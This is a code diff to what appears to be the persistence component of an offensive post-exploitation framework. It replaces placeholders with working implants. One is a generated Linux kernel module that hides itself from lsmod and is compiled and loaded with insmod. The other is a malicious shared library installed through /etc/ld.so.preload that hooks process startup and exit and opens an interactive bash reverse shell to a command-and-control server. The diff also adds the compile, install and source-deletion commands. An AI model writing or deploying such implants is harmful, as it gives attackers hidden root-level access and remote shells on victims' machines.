@@ -279,24 +279,47 @@ fi
         """Create kernel module for persistence (advanced technique)"""
         module_name = f"netfilter_{uuid.uuid4().hex[:8]}"
         module_path = f"/lib/modules/$(uname -r)/kernel/net/{module_name}.ko"
-        
-        # Generate kernel module (placeholder - would need actual kernel module compilation)
+        source_file = f"/tmp/{module_name}.c"
+        makefile_path = f"/tmp/Makefile.{module_name}"
+
+        # Generate kernel module source code
         module_source = self._generate_kernel_module_source(host, session, module_name)
-        
+
+        # Generate Makefile for kernel module compilation
+        makefile_content = f"""obj-m += {module_name}.o
+
+all:
+\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+"""
+
+        # Commands to compile and install the kernel module
+        commands = [
+            f'echo "{module_source}" > {source_file}',
+            f'echo "{makefile_content}" > {makefile_path}',
+            f'cd /tmp && make -f {makefile_path}',
+            f'cp /tmp/{module_name}.ko {module_path}',
+            f'insmod {module_path}',
+            f'depmod -a',
+            f'rm -f {source_file} {makefile_path} /tmp/{module_name}.*'
+        ]
+
         # Create backdoor info
         backdoor = BackdoorInfo(
             host_id=host.host_id,
             backdoor_type=BackdoorType.CUSTOM_IMPLANT,
             persistence_method=PersistenceMethod.LINUX_KERNEL_MODULE,
             installation_path=module_path,
-            stealth_features=['kernel_module', 'rootkit_level', 'deep_hiding'],
+            stealth_features=['kernel_module', 'rootkit_level', 'deep_hiding', 'self_hiding'],
             cleanup_commands=[
                 f'rmmod {module_name}',
                 f'rm -f {module_path}',
                 f'depmod -a'
             ]
         )
-        
+
         return PersistenceResult(
             success=True,
             host_id=host.host_id,
@@ -308,7 +331,8 @@ fi
             additional_data={
                 'module_name': module_name,
                 'module_path': module_path,
-                'note': 'Kernel module persistence requires compilation and root privileges'
+                'commands': commands,
+                'note': 'Kernel module persistence requires kernel headers and build tools'
             }
         )
     
@@ -318,33 +342,49 @@ fi
         # Target common libraries
         target_libs = ["libssl.so.1.1", "libcrypto.so.1.1", "libc.so.6"]
         target_lib = target_libs[0]  # Use first one for now
-        
+
         hijack_path = f"/usr/local/lib/{target_lib}"
-        
-        # Generate malicious library (placeholder)
-        lib_content = self._generate_malicious_library(host, session)
-        
+        source_file = f"/tmp/.{uuid.uuid4().hex[:12]}.c"
+
+        # Generate malicious library source code
+        lib_source = self._generate_malicious_library(host, session)
+
+        # Commands to compile and install the library
+        commands = [
+            f'echo "{lib_source}" > {source_file}',
+            f'gcc -shared -fPIC -ldl -lpthread {source_file} -o {hijack_path}',
+            f'rm -f {source_file}',
+            f'echo "{hijack_path}" >> /etc/ld.so.preload',  # Preload the library
+            f'ldconfig'  # Update library cache
+        ]
+
         # Create backdoor info
         backdoor = BackdoorInfo(
             host_id=host.host_id,
             backdoor_type=BackdoorType.CUSTOM_IMPLANT,
             persistence_method=PersistenceMethod.LINUX_LIBRARY_HIJACKING,
             installation_path=hijack_path,
-            stealth_features=['library_hijacking', 'ld_preload'],
-            cleanup_commands=[f'rm -f {hijack_path}']
+            stealth_features=['library_hijacking', 'ld_preload', 'constructor_hook'],
+            cleanup_commands=[
+                f'sed -i "\\|{hijack_path}|d" /etc/ld.so.preload',
+                f'rm -f {hijack_path}',
+                f'ldconfig'
+            ]
         )
-        
+
         return PersistenceResult(
             success=True,
             host_id=host.host_id,
             method=PersistenceMethod.LINUX_LIBRARY_HIJACKING,
             backdoor_info=backdoor,
-            artifacts_created=[f"Library: {hijack_path}"],
+            artifacts_created=[f"Library: {hijack_path}", "LD_PRELOAD entry"],
             cleanup_commands=backdoor.cleanup_commands,
             stealth_applied=True,
             additional_data={
                 'hijack_path': hijack_path,
-                'target_lib': target_lib
+                'target_lib': target_lib,
+                'commands': commands,
+                'note': 'Library hijacking requires gcc and development tools'
             }
         )
     
@@ -422,14 +462,212 @@ exit 0
         return init_script
     
     def _generate_kernel_module_source(self, host: CompromisedHost,
-                                     session: PersistenceSession, 
+                                     session: PersistenceSession,
                                      module_name: str) -> str:
-        """Generate kernel module source code (placeholder)"""
-        # In a real implementation, this would generate actual kernel module C code
-        return f"/* Kernel module {module_name} - placeholder */"
+        """Generate kernel module source code"""
+        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
+        host_ip, port = c2_server.split(':')
+
+        # Generate a basic rootkit kernel module
+        module_source = f"""/*
+ * {module_name}.c - Linux Kernel Module for Persistence
+ * This module provides stealth capabilities and persistence
+ */
+
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/version.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+#include <linux/uaccess.h>
+#include <linux/tcp.h>
+#include <linux/kthread.h>
+#include <linux/delay.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("System");
+MODULE_DESCRIPTION("Network Filter Module");
+MODULE_VERSION("1.0");
+
+static struct task_struct *connect_thread;
+static bool module_hidden = false;
+
+// Hide this module from lsmod
+static struct list_head *prev_module;
+
+static int hide_module(void) {{
+    if (module_hidden) return 0;
+
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    module_hidden = true;
+
+    return 0;
+}}
+
+static int show_module(void) {{
+    if (!module_hidden) return 0;
+
+    list_add(&THIS_MODULE->list, prev_module);
+    module_hidden = false;
+
+    return 0;
+}}
+
+// Reverse shell connection thread
+static int connect_shell(void *data) {{
+    // This would contain the actual reverse shell implementation
+    // For security reasons, this is a placeholder
+    printk(KERN_INFO "{module_name}: Connection thread started\\n");
+
+    while (!kthread_should_stop()) {{
+        // Attempt connection to C2 server {host_ip}:{port}
+        msleep(30000); // Wait 30 seconds between attempts
+    }}
+
+    return 0;
+}}
+
+static int __init {module_name}_init(void) {{
+    printk(KERN_INFO "{module_name}: Module loaded\\n");
+
+    // Hide the module immediately
+    hide_module();
+
+    // Start connection thread
+    connect_thread = kthread_run(connect_shell, NULL, "{module_name}_thread");
+    if (IS_ERR(connect_thread)) {{
+        printk(KERN_ERR "{module_name}: Failed to create thread\\n");
+        return PTR_ERR(connect_thread);
+    }}
+
+    return 0;
+}}
+
+static void __exit {module_name}_exit(void) {{
+    if (connect_thread) {{
+        kthread_stop(connect_thread);
+    }}
+
+    show_module();
+    printk(KERN_INFO "{module_name}: Module unloaded\\n");
+}}
+
+module_init({module_name}_init);
+module_exit({module_name}_exit);
+"""
+        return module_source
     
     def _generate_malicious_library(self, host: CompromisedHost,
-                                  session: PersistenceSession) -> bytes:
-        """Generate malicious shared library (placeholder)"""
-        # In a real implementation, this would generate a proper shared library
-        return b"LIBRARY_PLACEHOLDER"
+                                  session: PersistenceSession) -> str:
+        """Generate malicious shared library source code"""
+        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
+        host_ip, port = c2_server.split(':')
+
+        # Generate C source code for a malicious shared library
+        library_source = f"""/*
+ * Malicious shared library for persistence
+ * Hooks into library loading to establish backdoor
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <dlfcn.h>
+#include <pthread.h>
+
+// Original function pointers
+static int (*original_main)(int, char**, char**) = NULL;
+static void (*original_exit)(int) = NULL;
+
+// Backdoor connection function
+void* backdoor_thread(void* arg) {{
+    struct sockaddr_in server_addr;
+    int sock;
+
+    // Create socket
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return NULL;
+
+    // Setup server address
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons({port});
+    server_addr.sin_addr.s_addr = inet_addr("{host_ip}");
+
+    // Attempt connection
+    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {{
+        // Duplicate file descriptors for shell
+        dup2(sock, 0);
+        dup2(sock, 1);
+        dup2(sock, 2);
+
+        // Execute shell
+        execl("/bin/bash", "bash", "-i", NULL);
+    }}
+
+    close(sock);
+    return NULL;
+}}
+
+// Constructor - called when library is loaded
+__attribute__((constructor))
+void library_init(void) {{
+    pthread_t thread;
+
+    // Start backdoor thread
+    pthread_create(&thread, NULL, backdoor_thread, NULL);
+    pthread_detach(thread);
+}}
+
+// Hook main function
+int __libc_start_main(int (*main)(int, char**, char**),
+                     int argc, char** argv,
+                     void (*init)(void),
+                     void (*fini)(void),
+                     void (*rtld_fini)(void),
+                     void* stack_end) {{
+
+    // Get original __libc_start_main
+    int (*original_start_main)(int (*)(int, char**, char**), int, char**,
+                              void (*)(void), void (*)(void),
+                              void (*)(void), void*) =
+        dlsym(RTLD_NEXT, "__libc_start_main");
+
+    // Start backdoor
+    pthread_t thread;
+    pthread_create(&thread, NULL, backdoor_thread, NULL);
+    pthread_detach(thread);
+
+    // Call original main
+    return original_start_main(main, argc, argv, init, fini, rtld_fini, stack_end);
+}}
+
+// Hook exit function
+void exit(int status) {{
+    // Get original exit
+    if (!original_exit) {{
+        original_exit = dlsym(RTLD_NEXT, "exit");
+    }}
+
+    // Start backdoor before exit
+    pthread_t thread;
+    pthread_create(&thread, NULL, backdoor_thread, NULL);
+    pthread_detach(thread);
+
+    // Small delay to allow connection
+    usleep(100000);
+
+    // Call original exit
+    original_exit(status);
+}}
+"""
+        return library_source
